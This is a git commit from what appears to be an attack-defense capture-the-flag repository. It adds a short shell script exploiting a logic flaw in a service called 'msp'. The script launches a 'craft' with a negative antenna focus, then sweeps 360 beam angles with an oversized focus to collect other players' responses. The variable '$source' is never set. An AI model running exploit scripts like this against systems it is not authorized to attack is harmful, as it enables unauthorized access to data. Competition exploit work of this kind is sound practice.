88d3a4501d7257a4711232ca3402300cc3218e3e
Alexey Kharlamov <der@2-47.ru>
2020-04-12 03:14:41 +0200

    msp: add another exploit

---
+++ sploits/msp/angle-logic.sh
@@ -0,0 +1,11 @@
+
+url="$1:5001"
+
+# create a new craft with negative angle
+newcraft=$(curl -s $url/launch/ -d '{"phase": 0, "height": 5000, "antenna_focus": -1.57, "narrow_beam_response": "ping", "mass": 100}')
+
+# just scan surroundings with huge antenna area
+for angle in $(seq 1 360); do
+  focus=200
+  curl -s $url/beam/$source -d '{"angle": '$angle', "focus": '$focus'}' | jq .responses[] -r
+done
